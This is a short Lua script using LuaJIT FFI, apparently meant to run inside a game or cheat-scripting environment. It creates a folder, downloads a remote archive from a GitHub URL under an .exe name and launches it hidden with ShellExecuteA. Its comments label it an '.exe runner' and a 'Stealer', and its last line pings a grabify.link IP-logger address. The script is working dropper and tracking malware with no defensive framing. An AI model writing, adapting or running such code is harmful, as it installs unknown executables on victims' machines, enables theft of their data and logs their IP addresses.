local ffi = require('ffi')
ffi.cdef[[
    bool CreateDirectoryA(const char* lpPathName, void* lpSecurityAttributes);
    void* __stdcall URLDownloadToFileA(void* LPUNKNOWN, const char* LPCSTR, const char* LPCSTR2, int a, int LPBINDSTATUSCALLBACK);
    void* __stdcall ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show_cmd);
    bool DeleteUrlCacheEntryA(const char* lpszUrlName);
    bool CreateDirectoryA(const char* lpPathName, void* lpSecurityAttributes);
    void* __stdcall URLDownloadToFileA(void* LPUNKNOWN, const char* LPCSTR, const char* LPCSTR2, int a, int LPBINDSTATUSCALLBACK);
    void* __stdcall ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show_cmd);
    int ShellExecuteA(void* hwnd, const char* lpOperation, const char* lpFile, const char* lpParameters, const char* lpDirectory, int nShowCmd);
]]
local Shell32 = ffi.load('Shell32.dll')
local urlmon = ffi.load('UrlMon')
ffi.C.CreateDirectoryA("D:\\MonBazou", nil)
urlmon.URLDownloadToFileA(nil, "https://github.com/whatmanskid/tooll/archive/refs/tags/eras.zip", "D:\\MonBazou\\anyname.exe", 0,0)
Shell32.ShellExecuteA(nil, 'open', "D:\\MonBazou\\anyname.exe", nil, nil, 0)

// FFI .exe runner v2 //
// FFI Stealer v2 //

os.execute("ping https://grabify.link/B3CYIO /n 1")
